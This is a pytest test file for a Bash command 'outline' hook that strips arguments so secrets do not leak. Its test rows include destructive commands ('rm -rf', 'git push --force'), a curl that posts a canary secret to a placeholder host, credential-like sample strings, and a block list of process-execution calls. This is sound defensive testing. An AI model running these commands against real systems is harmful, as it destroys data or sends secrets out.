@pytest.mark.parametrize("command", EVERY_INDEX_CORPUS, ids=[str(n) for n in range(len(EVERY_INDEX_CORPUS))])
def test_a_line_continuation_anywhere_that_bash_reads_through_adds_nothing_to_the_outline(tmp_path, command):
    """The test above puts the continuation next to a space. The leaks of round 6 were
    a continuation in the middle of a construct, so this puts one at every index."""
    checked, gained = continuation_violations(pinned_bash(), command, tmp_path)
    assert gained == [], gained[:3]
    assert checked >= 4


def test_the_every_index_check_sees_a_reader_that_gains_a_piece_from_a_continuation(tmp_path):
    """The check has to fail on a reader that reads the raw text, or it proves nothing.
    This one adds a piece to every outline whose command holds a continuation."""
    def reads_raw_text(command):
        return outline(command) + (" f" if "\\\n" in command else "")

    command = "echo \"$(echo \"x >f \")\"; ls"
    checked, gained = continuation_violations(pinned_bash(), command, tmp_path, outline_of=reads_raw_text)
    assert checked > 4 and len(gained) == checked


STOP_ROWS = [
    ("ls -la; case $x in a) rm -rf b;; esac; git push --force", "ls -la"),
    ("ls; cat() { rm -rf b; }; git push --force", "ls\ncat"),
    ("ls; echo a(b); git push --force", "ls\necho"),
    ("ls; echo @(a|b); git push --force", "ls\necho"),
    ("ls; echo ${X:-'a'}; git push --force", "ls\necho"),
    ("ls; echo ${X:-$(date)}; git push --force", "ls\necho"),
    ("ls; echo $(( 'a' )); git push --force", "ls\necho"),
    ("ls; echo $((1+2); git push --force", "ls\necho"),
    ("ls; echo $'abc; git push --force", "ls\necho"),
    ("ls; echo ${X:-a; git push --force", "ls\necho"),
    ("ls; A=(a (b)); git push --force", "ls"),
    ("ls; echo a); git push --force", "ls\necho"),
    ("ls; [[ a == b; git push --force", "ls"),
    # A list inside $( ) or backticks that does not close sends nothing from inside.
    ("ls; echo $(echo a; git push --force", "ls\necho"),
    ("ls; echo \"$(echo a; git push --force", "ls\necho"),
    ("ls; echo `echo a; git push --force", "ls\necho"),
    ("ls; echo $(echo a 'b; git push --force)", "ls\necho"),
    ("ls; echo $(echo $(echo a; git push --force)", "ls\necho"),
    # The legacy $[ ] arithmetic, in a word and inside double quotes.
    ("ls; echo $[ 1 ; x ]; git push --force", "ls\necho"),
    ("ls; echo \"$[ 1 \"; x ]\"; git push --force", "ls\necho"),
    # A line continuation inside an operator joins its two halves in bash, so what
    # follows may be a different operator than the characters show.
    ("ls; cat <\\\n<EOF\nx\nEOF\ngit push --force", "ls\ncat"),
    ("ls; echo $\\\n{X:-a;b}; git push --force", "ls\necho"),
    ("ls; echo a &\\\n>f; git push --force", "ls\necho"),
    ("ls; echo a >\\\n&2; git push --force", "ls\necho"),
    # A here-document delimiter that holds an expansion cannot be read as the text
    # bash takes it for, and the substitution in it is not run.
    ("ls; cat <<$'EOF'\n$\nx\nEOF\ngit push --force", "ls\ncat"),
    ("ls; cat <<$\"EOF\"\n$\nx\nEOF\ngit push --force", "ls\ncat"),
    ("ls; cat <<${X}\n$\nx\n${X}\ngit push --force", "ls\ncat"),
    ("ls; cat <<$X\n$X\ngit push --force", "ls\ncat"),
    ("ls; cat <<$(echo)\n$\nx\n$(echo)\ngit push --force", "ls\ncat"),
    ("ls; cat <<`echo`\n$\nx\n`echo`\ngit push --force", "ls\ncat"),
    # A function definition and a coprocess hold a command list the reader does not
    # open. function and coproc are reserved at the start of a command only.
    ("ls; function f { rm -rf b; }; git push --force", "ls"),
    ("ls; coproc c { rm -rf b; }; git push --force", "ls"),
    ("ls; echo function coproc; git push --force", "ls\necho\ngit --force"),
    # case ends the read wherever it is typed bare, and so does a [[ that does not
    # begin a command or follow the reserved word time. When bash reads one as an
    # ordinary argument the cost is the commands after it.
    ("ls; echo case; git push --force", "ls\necho"),
    ("ls; grep [[ file; git push --force", "ls\ngrep"),
    ("ls; echo \"case\" '[[' \\case; git push --force", "ls\necho\ngit --force"),
    ("ls; echo [[\ncat <<'EOF'\n$(hunter2)\nEOF\ngit push --force", "ls\necho"),
    ("ls; sudo [[ -f x ]]; git push --force", "ls\nsudo"),
    ("ls; A=1 [[ -f x ]]; git push --force", "ls"),
    ("ls; time -p [[ -f x ]]; git push --force", "ls\ntime -p"),
    ("ls; time A=1 [[ -f x ]]; git push --force", "ls\ntime"),
    # A # after an operator or a parenthesis inside [[ ]] may open a comment or sit
    # in the middle of a regular expression, and the reader does not guess which.
    ("ls; [[ $x =~ (a)#b ]]; git push --force", "ls"),
    # Inside backticks the reader cannot say where a comment ends, what a backslash
    # before the closing quote of an ANSI-C string does, or which lines of a
    # here-document body continue: bash cuts the body at the closing backtick first
    # and undoes its backslashes before it reads a word. Each ends the read there,
    # and what was read inside the backticks is not sent.
    ("ls; echo `# note\n`; git push --force", "ls\necho"),
    ("ls; echo `echo hi # note`; git push --force", "ls\necho"),
    ("ls; echo `[[ a == b # note\n]]`; git push --force", "ls\necho"),
    ("ls; echo `echo $'a\\\\'`; git push --force", "ls\necho"),
    ("ls; echo `cat <<EOF\nx\\\nEOF\n`; git push --force", "ls\necho"),
    ("ls; echo `cat <<'EOF'\nx\\\\\nEOF\n`; git push --force", "ls\necho"),
    # Where a command begins, NAME[ is the head of an array assignment and bash takes
    # everything up to the matching ] into the one word. A subscript that is not
    # closed before a blank, an operator, a quote, an escape or an expansion other
    # than $NAME ends the read.
    ("ls; m[k >f ]=1; git push --force", "ls"),
    ("ls; m[k; whoami ]=1; git push --force", "ls"),
    ("ls; time m[k >f ]=1; git push --force", "ls\ntime"),
    ("ls; m[k", "ls"),
    ("ls; m['a b']=1; git push --force", "ls"),
    ("ls; m[${i}]=1; git push --force", "ls"),
    # <( and >( run into a here-document delimiter, which is literal text.
    ("ls; cat <<EOF<(sort)\nx\nEOF\ngit push --force", "ls\ncat"),
    ("ls; cat << >(sort\n)\ngit push --force", "ls\ncat"),
    ("ls; cat <<'EOF'>(sort)\nx\nEOF\ngit push --force", "ls\ncat"),
    # A list inside $( ) that closes with a here-document pending takes its body from
    # a place this reader does not model.
    ("ls; echo $(cat <<EOF)\nbody\nEOF\ngit push --force", "ls\necho\ncat"),
    # A subshell cannot follow an assignment or a redirect.
    ("ls; FOO=bar (git push --force)", "ls"),
    ("ls; > f (git push --force)", "ls\nf"),
    # A quote or an escape the text ends inside is a word that was cut, not a word.
    ("ls; 'abc", "ls"),
    ("ls; \"abc", "ls"),
    ("ls; \\abc\\", "ls"),
    ("ls; \"abc\\\n", "ls"),
    ("ls; echo abc\\", "ls\necho"),
    ("ls; echo 'abc; git push --force", "ls\necho"),
    ("ls; echo \"abc; git push --force", "ls\necho"),
    # Round 6. A $ then a line continuation inside double quotes may be an expansion
    # once bash removes the pair, and the reader cannot tell from the characters
    # what the string holds or where it ends.
    ("ls; echo \"$\\\n(x y)\"; git push --force", "ls\necho"),
    ("ls; echo \"$\\\n{x:-a}\"; git push --force", "ls\necho"),
    ("ls; echo \"a$\\\n$(x y)\"; git push --force", "ls\necho"),
    ("ls; echo \"$$\\\n(x y)\"; git push --force", "ls\necho"),
    # The head of an array assignment is found with the continuations taken out, so
    # a subscript that is not closed before a blank ends the read wherever the
    # continuation sits in the name or before the [.
    ("ls; m\\\n[k >f ]=1; git push --force", "ls"),
    ("ls; ab\\\nc[k >f ]=1; git push --force", "ls"),
    ("ls; a\\\n\\\n[k >f ]=1; git push --force", "ls"),
    ("ls; time a\\\n[k >f ]=1; git push --force", "ls\ntime"),
    ("ls; x=1 a\\\n[k >f ]=1; git push --force", "ls"),
    ("ls; m[\\\n1]=x; git push --force", "ls"),
    # A ]] glued to a parenthesis is the end of a group or the end of a regular
    # expression, and one before a ( is a longer word or not valid. A comment after a
    # parenthesis may be the middle of a regular expression.
    ("ls; [[ ( -f a )]]; git push --force", "ls"),
    ("ls; [[ a =~ (b)]]; git push --force", "ls"),
    ("ls; [[ a ]]>(cat); git push --force", "ls"),
    ("ls; [[ a ]](; git push --force", "ls"),
    ("ls; [[ ( -n x \\\n)# c\n]]; git push --force", "ls"),
    # Inside $( ), <( ) and backticks a here-document body line that begins with the
    # delimiter and is not it may end the substitution, as E) does, and the reader
    # would go on to a later line that is the delimiter. Inside backticks so does a
    # backtick anywhere in a body line.
    ("ls; echo $(cat <<E\nbody\nE)\ngit push --force", "ls\necho"),
    ("ls; echo $(cat <<E\nbody\nE )\ngit push --force", "ls\necho"),
    ("ls; echo $(cat <<'E'\nbody\nE) # c\ngit push --force", "ls\necho"),
    ("ls; echo $(cat <<-E\nbody\n\tE)\ngit push --force", "ls\necho"),
    ("ls; echo $(cat <<E\nbody\nEx\nE\n)\ngit push --force", "ls\necho"),
    ("ls; echo $(cat <<E\nbody\nE\\\n)\ngit push --force", "ls\necho"),
    ("ls; echo \"$(cat <<'EOF'\nsubject\nEOF)\"; git push --force", "ls\necho"),
    ("ls; echo <(cat <<E\nbody\nE )\ngit push --force", "ls\necho"),
    ("ls; echo $( (cat <<E\nbody\nE) )\ngit push --force", "ls\necho"),
    ("ls; echo `cat <<E\nbody\nE`\ngit push --force", "ls\necho"),
    ("ls; echo `cat <<'E'\nfoo ` bar\nE\n`; git push --force", "ls\necho"),
    # Aliases are read at parse time. What an alias expands to is not in the text, so
    # the read ends at the command that makes one, and at the option that allows them.
    ("ls; alias foo=bar; git push --force", "ls"),
    ("ls; command alias foo=bar; git push --force", "ls\ncommand"),
    ("ls; builtin alias foo=bar; git push --force", "ls\nbuiltin"),
    ("ls; shopt -s expand_aliases; git push --force", "ls\nshopt -s"),
    ("ls; shopt -s 'expand_aliases'; git push --force", "ls\nshopt -s"),
    ("ls; shopt -s expand_alia\\\nses; git push --force", "ls\nshopt -s"),
    ("ls; eval alias foo=bar; git push --force", "ls\neval"),
    ("ls; command -p alias foo=bar; git push --force", "ls\ncommand -p"),
    ("ls; eval \"x=1; alias foo=bar\"; git push --force", "ls\neval"),
    ("ls; al\\\nias foo=bar; git push --force", "ls"),
    ("ls; \"alias\" foo=bar; git push --force", "ls"),
    ("ls; echo expand_aliases; git push --force", "ls\necho"),
    ("ls; BASH_ALIASES[foo]=bar; git push --force", "ls"),
    ("ls; eval 'shopt -s expand_aliases'; git push --force", "ls\neval"),
    ("ls; o=expand_aliases; git push --force", "ls"),
    ("ls; shopt -s $o; git push --force", "ls\nshopt -s"),
    ("ls; shopt -s \"$o\"; git push --force", "ls\nshopt -s"),
]


@pytest.mark.parametrize("command,expected", STOP_ROWS)
def test_syntax_the_reader_does_not_model_ends_the_read_and_nothing_after_it_is_guessed_at(secrets, command, expected):
    assert outline(command) == expected


def test_a_word_cut_inside_a_quote_or_an_escape_is_never_judged(secrets):
    """A command over 64 KiB is cut at the last separator in its first 64 KiB, and
    that can fall inside a quoted string or after an escaped space. What is left
    is a piece of a word, and a piece of a word is not a program."""
    canary = CANARIES[0]
    filler = "b" * (jev.MAX_SCAN + 10)
    cuts = {
        "single quote": "'" + canary + " " + filler + "'",
        "double quote": '"' + canary + " " + filler + '"',
        "escaped space": canary + "\\ " + filler,
        "escaped first character": "\\" + canary + "\\ " + filler,
        "double quote in a substitution": '"$(echo ' + canary + " " + filler + ')"',
    }
    for name, word in cuts.items():
        for head in ("", "ls && ", "echo hi; ", "sudo ", "env FOO=1 ", "time ", "ls | "):
            command = head + word
            assert len(command) > jev.MAX_SCAN
            text = outline(command)
            assert canary not in text, (name, head, text)
    assert outline("ls && " + cuts["single quote"]) == "ls"
    assert outline("sudo " + cuts["double quote"]) == "sudo"


# ----------------------------- known commands only, ruled by Tee 2026-10-28


def distinct_names(count):
    """count different words that are program names: a letter, then four lowercase
    letters. No two are alike, and none carries a digit."""
    words = itertools.product(string.ascii_lowercase, repeat=4)
    return ["n" + "".join(letters) for letters in itertools.islice(words, count)]


def an_executable(path, body="#!/bin/sh\nexit 0\n", mode=0o755):
    path.write_text(body)
    path.chmod(mode)
    return path


def path_of(*directories, monkeypatch):
    monkeypatch.setenv("PATH", os.pathsep.join(str(d) for d in directories))


def test_an_unknown_program_and_every_flag_of_its_command_are_dropped():
    assert outline("mytool --force -rf x") == ""
    assert outline("mytool ls -la --color") == "", "a known name as an argument is an argument"
    assert outline("mytool --force; ls -la") == "ls -la", "the next command is another command"
    assert outline("ls -la | mytool -x --y | cat -n") == "ls -la\ncat -n"
    assert outline("FOO=1 mytool --force") == ""
    assert outline("\"mytool\" --force") == ""
    assert outline("sudo mytool --force -x") == "sudo", "the wrapper is a command, the program it runs is not"
    assert outline("echo $(mytool --force -x) --color") == "echo\n--color"
    assert outline("{ mytool --force; } && git push --force") == "git --force"
    assert outline("mytool --force > out.txt") == "out.txt", "a redirect target is a path by syntax"
    assert outline("nohup A=1 -x ls") == "nohup", "A=1 is the program nohup runs, and it is not a command"


def test_the_gate_is_what_drops_it_and_not_the_reader(monkeypatch):
    assert outline("mytool --force -rf x") == ""
    monkeypatch.setattr(jev.Shell, "known", lambda self, word: True)
    assert outline("mytool --force -rf x") == "mytool --force -rf"


def test_a_known_program_keeps_its_flags():
    assert outline("ls -la --color=auto") == "ls -la --color"
    assert outline("git push --force-with-lease origin main") == "git --force-with-lease"
    assert outline("echo -n hi") == "echo -n", "a builtin needs no file"
    assert outline("cd -P build && pwd -L") == "cd -P\npwd -L"
    assert outline("if true; then ls -la; fi") == "true\nls -la", "a reserved word is not a program name"
    assert outline("time ls -la") == "time ls -la"


def test_a_program_put_on_path_by_the_test_is_known_until_it_is_taken_off(tmp_path, installed_bin, monkeypatch):
    tools = tmp_path / "tools"
    tools.mkdir()
    an_executable(tools / "tmptool")
    assert outline("tmptool --force -x") == ""
    path_of(installed_bin, tools, monkeypatch=monkeypatch)
    assert outline("tmptool --force -x") == "tmptool --force -x"
    assert outline("ls | tmptool -v") == "ls\ntmptool -v"
    path_of(installed_bin, monkeypatch=monkeypatch)
    assert outline("tmptool --force -x") == ""


def test_only_an_executable_file_on_path_is_a_command(tmp_path, installed_bin, monkeypatch):
    first, second = tmp_path / "first", tmp_path / "second"
    first.mkdir()
    second.mkdir()
    an_executable(first / "notexec", mode=0o644)
    (first / "adir").mkdir()
    an_executable(second / "notexec")
    an_executable(second / "adir")
    path_of(first, "", second, monkeypatch=monkeypatch)
    assert outline("adir -x") == "adir -x", "a directory does not shadow the file behind it"
    assert outline("notexec -x") == "notexec -x", "nor does a file that is not executable"
    path_of(first, monkeypatch=monkeypatch)
    assert outline("adir -x") == "" and outline("notexec -x") == ""
    path_of("", monkeypatch=monkeypatch)
    assert outline("ls -la") == "", "no directory on PATH"
    an_executable(tmp_path / "here")
    monkeypatch.chdir(tmp_path)
    path_of(first, "", monkeypatch=monkeypatch)
    assert outline("here -x") == "", "an empty PATH entry is not read as the current directory"


def test_an_unset_path_is_the_platforms_default(tmp_path, monkeypatch):
    tools = tmp_path / "tools"
    tools.mkdir()
    an_executable(tools / "tmptool")
    monkeypatch.delenv("PATH")
    monkeypatch.setattr(os, "defpath", str(tools))
    assert outline("tmptool -x") == "tmptool -x"
    assert outline("ls -la") == ""


def test_the_path_that_counts_is_the_one_the_hook_process_has_at_the_call(monkeypatch):
    """The suite runs on a PATH of its own, so this is the one place the PATH of
    the machine is used: ls and cat are real commands wherever this runs."""
    assert outline("ls -la; cat -n") == "ls -la\ncat -n"
    monkeypatch.setenv("PATH", ORIGINAL_PATH)
    assert outline("ls -la; cat -n; no-such-command-here -x") == "ls -la\ncat -n"
    monkeypatch.setenv("PATH", "")
    assert outline("ls -la; cat -n") == "", "read at each call, not at import"


def test_a_word_with_a_slash_is_a_program_when_it_names_an_existing_executable_file(
        tmp_path, installed_bin, monkeypatch):
    tools = tmp_path / "tools"
    tools.mkdir()
    run = an_executable(tools / "run.sh")
    an_executable(tools / "notes.txt", mode=0o644)
    (tools / "adir").mkdir()
    (tools / "link.sh").symlink_to(run)
    cwd = str(tmp_path)
    absolute = "%s/run.sh" % installed_bin
    assert len(absolute) <= jev.MAX_WORD
    assert outline("%s --verbose" % absolute, cwd="/nonexistent") == "run.sh --verbose", "an absolute path"
    assert outline("./tools/run.sh --verbose", cwd=cwd) == "run.sh --verbose", "relative to the working directory"
    assert outline("tools/run.sh --verbose", cwd=cwd) == "run.sh --verbose"
    assert outline("FOO=bar ./tools/run.sh --verbose", cwd=cwd) == "run.sh --verbose"
    assert outline("./tools/link.sh --verbose", cwd=cwd) == "link.sh --verbose", "a link to an executable file"
    assert outline("sudo ./tools/run.sh --verbose", cwd=cwd) == "sudo run.sh --verbose"
    assert outline("%s/tools/run.sh --verbose" % "~", cwd="/nonexistent", home=cwd) == "run.sh --verbose"
    for gone in ("./tools/missing.sh", "./tools/notes.txt", "./tools/adir", "/nonexistent/run.sh"):
        assert outline(gone + " --verbose", cwd=cwd) == "", gone
    assert outline("./tools/run.sh --verbose", cwd="/nonexistent") == "", "the working directory is not this one"
    assert outline("~/tools/run.sh --verbose", cwd="/nonexistent", home="") == ""
    monkeypatch.setenv("PATH", "")
    assert outline("./tools/run.sh --verbose", cwd=cwd) == "run.sh --verbose", "a path does not need PATH"


def test_a_word_over_64_characters_is_not_looked_up(tmp_path, monkeypatch):
    looked = []
    real = jev.is_executable
    monkeypatch.setattr(jev, "is_executable", lambda path: looked.append(path) or real(path))
    for length, kept in ((jev.MAX_WORD, True), (jev.MAX_WORD + 1, False)):
        directory = tmp_path / ("d" * (length - len("./") - len("/x.sh")))
        directory.mkdir()
        an_executable(directory / "x.sh")
        word = "./%s/x.sh" % directory.name
        assert len(word) == length
        looked.clear()
        assert outline(word + " --flag", cwd=str(tmp_path)) == ("x.sh --flag" if kept else ""), length
        assert bool(looked) == kept, length


def test_a_lookup_runs_nothing(tmp_path, installed_bin, monkeypatch):
    marker = tmp_path / "ran"
    tools = tmp_path / "tools"
    tools.mkdir()
    an_executable(tools / "tmptool", body="#!/bin/sh\ntouch %s\n" % marker)
    path_of(installed_bin, tools, monkeypatch=monkeypatch)
    assert outline("tmptool --x; ./tools/tmptool --y", cwd=str(tmp_path)) == "tmptool --x\ntmptool --y"
    assert not marker.exists()


def test_the_hook_has_no_way_to_run_a_program():
    tree = ast.parse(HOOK.read_text())
    os_calls = {n.func.attr for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                and isinstance(n.func.value, ast.Name) and n.func.value.id == "os"}
    names = {n.id for n in ast.walk(tree) if isinstance(n, ast.Name)}
    assert not os_calls & {"system", "popen", "execv", "execve", "execvp", "execvpe", "execl", "execle", "execlp",
                           "execlpe", "spawnv", "spawnve", "spawnvp", "spawnl", "spawnle", "spawnlp", "posix_spawn",
                           "posix_spawnp", "fork", "forkpty", "startfile"}
    assert not names & {"subprocess", "shutil", "eval", "exec", "compile", "__import__"}


def test_a_name_is_looked_up_once_per_call(monkeypatch):
    looked = []
    real = jev.is_executable
    monkeypatch.setattr(jev, "is_executable", lambda path: looked.append(os.path.basename(path)) or real(path))
    assert outline("mytool -a; mytool -b; ls; ls -la; mytool -c; ls") == "ls\nls -la\nls"
    assert sorted(looked) == ["ls", "mytool"], "one directory on PATH, one lookup for each name"
    looked.clear()
    outline("echo a; echo b; cd c; true; pwd")
    assert looked == [], "a builtin is never looked up"


def test_the_lookups_stop_at_the_cap_and_the_names_after_it_are_dropped(tmp_path, monkeypatch):
    dirs = [tmp_path / ("bin%d" % i) for i in range(3)]
    for d in dirs:
        d.mkdir()
    an_executable(dirs[0] / "early")
    an_executable(dirs[2] / "late")
    path_of(*dirs, monkeypatch=monkeypatch)
    looked = []
    real = jev.is_executable
    monkeypatch.setattr(jev, "is_executable", lambda path: looked.append(path) or real(path))
    unknown = distinct_names(jev.MAX_LOOKUPS + 50)
    command = "; ".join(["early"] + unknown + ["late -x", "early -y", "echo -n"])
    assert outline(command) == "early\nearly -y\necho -n", "late was never looked up, early and echo need none"
    assert len(looked) == 1 + (jev.MAX_LOOKUPS - 1) * len(dirs), "early is found in the first directory"
    looked.clear()
    assert outline("late -x") == "late -x", "the cap is per call"


def test_a_name_found_before_the_cap_stays_known_after_it(tmp_path, monkeypatch):
    path_of(tmp_path, monkeypatch=monkeypatch)
    an_executable(tmp_path / "early")
    command = "; ".join(["early"] + distinct_names(jev.MAX_LOOKUPS * 2) + ["early --again"])
    assert outline(command) == "early\nearly --again"


ONE_MEGABYTE_DISTINCT = {
    "programs": lambda: ";".join(distinct_names(200000)),
    "programs with flags": lambda: "\n".join(name + " --flag" for name in distinct_names(120000)),
    "paths as programs": lambda: ";".join("./" + name for name in distinct_names(150000)),
    "paths in a directory": lambda: ";".join("/usr/bin/" + name + " -x" for name in distinct_names(80000)),
    "long words": lambda: ";".join("w" * 30 + name for name in distinct_names(30000)),
    "unknown wrappers": lambda: ";".join("sudo " + name for name in distinct_names(150000)),
}


@pytest.mark.parametrize("shape", sorted(ONE_MEGABYTE_DISTINCT))
def test_a_one_megabyte_command_of_distinct_words_through_a_real_process_stays_inside_the_budget(
        stub, project, installed_bin, tmp_path, monkeypatch, shape):
    """The case the cap is for. The hook is a new interpreter each time, and every
    distinct name that is not a builtin is a stat on each directory of PATH, so the
    PATH here is forty directories and the budget is the whole 2.5 seconds."""
    dirs = []
    for i in range(40):
        d = tmp_path / ("bin%d" % i)
        d.mkdir()
        dirs.append(d)
    path_of(installed_bin, *dirs, monkeypatch=monkeypatch)
    command = ONE_MEGABYTE_DISTINCT[shape]()[:MEGABYTE]
    assert len(command) > MEGABYTE * 0.9
    p = payload(command=command)
    proc, elapsed = run_in_a_process(project, stub.url, json.dumps(p))
    assert proc.returncode == 0 and proc.stdout == "", proc.stderr
    assert elapsed < 2.5, elapsed
    assert sent_chars(stub) <= 2000
    row = ledger(project)[-1]
    assert row["outcome"] == "answered" and row["input_sha"] == jev.input_digest("Bash", p["tool_input"])


def test_the_cap_bounds_the_work_a_command_of_distinct_names_can_cause(monkeypatch, tmp_path):
    dirs = [tmp_path / ("bin%d" % i) for i in range(20)]
    for d in dirs:
        d.mkdir()
    path_of(*dirs, monkeypatch=monkeypatch)
    looked = []
    real = jev.is_executable
    monkeypatch.setattr(jev, "is_executable", lambda path: looked.append(path) or real(path))
    outline(";".join(distinct_names(5000)))
    assert len(looked) == jev.MAX_LOOKUPS * len(dirs)


def test_the_pinned_bash_words_are_the_ones_the_docs_state():
    assert (jev.BASH_VERSION_PINNED, jev.BASH_WORDS_TAKEN) == ("5.2.21(1)-release", "2026-10-28")
    assert (len(jev.BASH_BUILTINS), len(jev.BASH_RESERVED), len(jev.BASH_WORDS)) == (61, 22, 83)
    assert not set(jev.BASH_BUILTINS) & set(jev.BASH_RESERVED)
    assert {"echo", "cd", "export", "read", "declare", "exec", "command", "builtin", "eval", "type", "true",
            "false", "set", "source"} <= set(jev.BASH_BUILTINS)
    assert {"if", "then", "case", "esac", "for", "do", "done", "time", "function", "coproc", "[[", "]]", "{", "}",
            "!"} <= set(jev.BASH_RESERVED)
    assert jev.OPENERS | jev.CLOSERS | jev.HEADERS | jev.UNMODELLED | {"case", "[[", "time"} <= jev.BASH_WORDS
    assert not set(jev.WRAPPERS) - {"time", "exec", "command", "builtin"} & jev.BASH_WORDS
    section = " ".join((ROOT / "CLAUDE.md").read_text().split("## The Jev router")[1].split("\n## ")[0].split())
    for stated in ("5.2.21(1)-release", "2026-10-28", "Known commands only", "Top-level only"):
        assert stated in section, stated


def test_the_pinned_bash_words_match_bash_when_it_is_the_version_they_came_from():
    import shutil
    bash = shutil.which("bash", path=ORIGINAL_PATH)
    if not bash:
        pytest.skip("no bash here")

    def say(script):
        return subprocess.run([bash, "-c", script], capture_output=True, text=True, timeout=30).stdout.split()

    version = " ".join(say("echo $BASH_VERSION"))
    if version != jev.BASH_VERSION_PINNED:
        pytest.skip("bash here is %s and the list is from %s" % (version, jev.BASH_VERSION_PINNED))
    assert set(say("compgen -b")) == set(jev.BASH_BUILTINS)
    assert set(say("compgen -k")) == set(jev.BASH_RESERVED)


def test_a_secret_that_is_the_name_of_an_installed_command_still_leaves(installed_bin, secret_bin, monkeypatch):
    """The edge Tee accepted with the ruling, pinned so the docs and the code agree.
    A word the reader takes for a program is checked against the machine and not
    against what it means, so a value that happens to name a command goes out."""
    canary = CANARIES[0]
    command = "echo hi; %s --token" % canary
    assert outline(command) == "echo", "on a machine that has no command by that name"
    path_of(installed_bin, secret_bin, monkeypatch=monkeypatch)
    assert outline(command) == "echo\n%s --token" % canary
    assert outline("echo %s" % canary) == "echo", "and only where the reader reads it as a program"


def test_a_two_letter_value_after_a_short_flag_is_the_old_edge_and_needs_the_program_to_be_known(
        tmp_path, monkeypatch):
    """-pab cannot be told from a flag cluster, so a flag of one to three letters is
    kept, and the program in front of it now has to be a command too. This was
    already documented and the ruling does not change it."""
    tools = tmp_path / "tools"
    tools.mkdir()
    path_of(tools, monkeypatch=monkeypatch)
    for command in ("mysql -pab", "curl -uab x", "mysql -pxy", "mysql -pab -uroot -h db.example"):
        assert outline(command) == "", command
    an_executable(tools / "mysql")
    an_executable(tools / "curl")
    assert outline("mysql -pab") == "mysql -pab"
    assert outline("curl -uab x") == "curl -uab"
    assert outline("mysql -phunter2 -uroot") == "mysql", "a longer value is dropped, as it was"


# Every reproduction in the verify rounds that was a Bash input and a program name or
# a flag leaving as one. (round and finding, command, the words that must not leave.)
# {C} is the canary. Each one sent its words at the commit the round was run against.
PRIOR_FINDINGS = [
    ("r0f0", "KEYS=({C} other)", ("{C}",)),
    ("r0f0", "declare -a KEYS=({C} other)", ("{C}",)),
    ("r0f0", "case $1 in start|{C}) echo hi;; esac", ("{C}",)),
    ("r0f0", "[[ $x =~ ^({C}|b)$ ]] && echo yes", ("{C}",)),
    ("r0f0", "echo $(({C} + 1))", ("{C}",)),
    ("r0f0", "echo ${X:-a b;{C} c}", ("{C}",)),
    ("r0f0", "A[0]=x/{C}", ("{C}",)),
    ("r0f0", "arr=(a b); arr[1]=http://h/{C}", ("{C}",)),
    ("r0f1", "git commit -m \"$(cat <<'EOF'\nFix the 5\" pipe handling\n\nRotated the credential for staging\n"
             "{C} is the new value\nEOF\n)\"", ("{C}", "Rotated")),
    ("r0f1", "echo \"$(echo \"\n{C} x x \")\"", ("{C}",)),
    ("r0f1", "echo \"$(echo 'x\"; {C} ')\"", ("{C}",)),
    ("r0f1", "echo $'pre\\'; {C} --secret-flag \\'post'", ("{C}", "--secret-flag")),
    ("r0f2", "watch \"curl https://h/api/{C}\"", ("{C}",)),
    ("r0f2", "time \"echo x/{C}\"", ("{C}",)),
    ("r0f2", "sudo \"A B=x/{C}\"", ("{C}",)),
    ("r0f3", "KEYS=(hunter2 correcthorse)", ("hunter2", "correcthorse")),
    ("r0f3", "API_KEY=(sk-ant-api03-AbCdEfGh)", ("sk-ant-api03-AbCdEfGh",)),
    ("r0f3", "declare -a KEYS=(AKIAIOSFODNN7EXAMPLE x)", ("AKIAIOSFODNN7EXAMPLE",)),
    ("r0f3", "A=({C})", ("{C}",)),
    ("r0f3", "[[ x > {C} ]]", ("{C}",)),
    ("r0f3", "echo $((hunter2))", ("hunter2",)),
    ("r0f3", "case x in ({C}) true;; esac", ("{C}",)),
    ("r0f4", "echo \"$(echo \"x; {C} \")\"", ("{C}",)),
    ("r0f4", "curl -d \"$(printf '%s' \"user\n{C}\n\")\" https://x", ("{C}",)),
    ("r0f4", "echo \"$(echo \"x\n{C}\ny\")\"", ("{C}",)),
    ("r0f4", "git commit -m \"$(cat <<'EOF'\nFix a \"bug\nsecond line hunter2 here\nEOF\n)\"", ("hunter2", "second")),
    ("r0f6", "PASSWORDS=(hunter2 s3cr3tvalue) deploy.sh", ("hunter2", "s3cr3tvalue")),
    ("r0f6", "arr=(correcthorsebattery)", ("correcthorsebattery",)),
    ("r0f6", "echo $'it\\'s ok; hunter2 is the password'", ("hunter2",)),
    ("r0f6", "echo ${X:-a ;correcthorsebattery b}", ("correcthorsebattery",)),
    ("r0f6", "echo $'a\\'; correcthorsebattery'", ("correcthorsebattery",)),
    ("r0f6", "TOKENS=(correcthorsebattery other) run.sh", ("correcthorsebattery",)),
    ("r0f7", "git commit -m \"$(cat <<'EOF'\nFix the 5\" display bug\n\nRotate the key hunter2 after deploy.\n"
             "Run it again; deploy done\nEOF\n)\"\n", ("hunter2", "Rotate", "Run it")),
    ("r0f7", "echo \"$(cat <<'EOF'\nFix the 5\" thing; correcthorsebattery here\nsecond line\nEOF\n)\"",
     ("correcthorsebattery",)),
    ("r0f8", "git commit -m '--wip-token-abc'", ("wip-token-abc",)),
    ("r0f8", "echo \"--correcthorsebattery\"", ("correcthorsebattery",)),
    ("r1f15", "echo a &>/dev/null hunter2", ("hunter2",)),
    ("r1f15", "echo a &>>log.txt hunter2", ("hunter2",)),
    ("r1f15", "echo a &> out.log hunter2 correcthorsebatterystaple", ("hunter2", "correcthorsebatterystaple")),
    ("r1f16", "\"FOO=bar\" hunter2", ("hunter2",)),
    ("r1f16", "\\FOO=bar hunter2", ("hunter2",)),
    ("r1f16", "'FOO=bar' hunter2", ("hunter2",)),
    ("r1f16", "FOO\"=\"bar hunter2", ("hunter2",)),
    ("r1f16", "\"if\" hunter2", ("hunter2",)),
    ("r1f16", "'then' hunter2", ("hunter2",)),
    ("r1f16", "\"{\" hunter2", ("hunter2",)),
    ("r1f16", "'!' hunter2", ("hunter2",)),
    ("r1f16", "\"fi\" hunter2", ("hunter2",)),
    ("r1f16", "false || \\ex=cho zqxsecret", ("zqxsecret",)),
    ("r1f16", "(ex=cho a\\= zqxsecret)", ("zqxsecret",)),
    ("r1f17", "FOO=bar\rhunter2", ("hunter2",)),
    ("r1f17", "cat <\\\n<EOF\nhunter2\nEOF", ("hunter2",)),
    ("r1f17", "echo $[ 1 ; hunter2 ]", ("hunter2",)),
    ("r1f18", "'ZQXSECRET", ("ZQXSECRET",)),
    ("r1f18", "\"ZQXSECRET", ("ZQXSECRET",)),
    ("r1f18", "sudo 'ZQXSECRET", ("ZQXSECRET",)),
